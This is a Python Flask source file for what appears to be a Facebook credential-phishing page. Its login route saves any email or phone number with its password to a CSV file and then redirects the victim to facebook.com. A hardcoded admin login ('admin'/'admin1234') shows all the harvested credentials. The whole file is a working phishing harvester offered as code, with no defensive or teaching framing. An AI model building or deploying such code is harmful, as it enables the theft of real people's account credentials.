from flask import Flask, redirect, render_template, request, session, url_for, flash
import csv
import os
import re

app = Flask(__name__, template_folder="Site2")

app.secret_key = "some_secret_key"

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        pattern = r"^\+?\d{10,15}$|^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$"
        if username == "admin" and password == "admin1234":
            session["username"] = username
            return redirect(url_for("admin"))
        else:
            if re.match(pattern, username):
                with open("data.csv", "a") as f:
                    writer = csv.writer(f)
                    writer.writerow([username,password])
                return redirect("https://www.facebook.com")
            else:
                return render_template("login.html", error="Invalid username or password")
    else:
        return render_template("login.html")

@app.route('/admin')
def admin():
    with open('data.csv', 'r') as f:
        reader = csv.reader(f)
        text = '\n'.join(['\t'.join(row) for row in reader])
    return render_template('home.html', text=text)

if __name__ == "__main__":  
    app.run(debug=True)